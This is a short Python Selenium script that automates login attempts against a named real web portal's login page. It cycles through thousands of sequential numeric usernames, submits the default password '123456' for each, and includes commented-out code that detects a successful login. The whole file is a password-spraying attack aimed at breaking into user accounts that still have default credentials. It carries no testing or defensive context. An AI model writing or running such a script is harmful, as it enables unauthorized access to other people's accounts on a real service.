import os
import pandas as pd
import numpy as np
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

driver = webdriver.Firefox()

startNumber = 170900000

def startFun():
    driver.get("http://mypage.i-on.in/loginpage.aspx")
    if not "My Page" in driver.title:
        raise Exception("Unable to load ION page!")

    for i in range(5000, 60000, 1000):
        for j in range(0,300):

            login = driver.find_element_by_id("loginform")
            login.click()
            un = driver.find_element_by_id("txtUserName")
            un.send_keys(str(startNumber + i + j))
            a = driver.find_element_by_id("txtlogPassword")
            a.send_keys("123456")
            submit = driver.find_element_by_id("btnSubmit")
            submit.click()
            #strinuse = driver.current_url()
            #if strinuse in "http:/i-on.in/Masters/MyProfile.aspx":
                #print("Success")
            driver.switchTo().alert().accept();
            driver.refresh()
startFun()


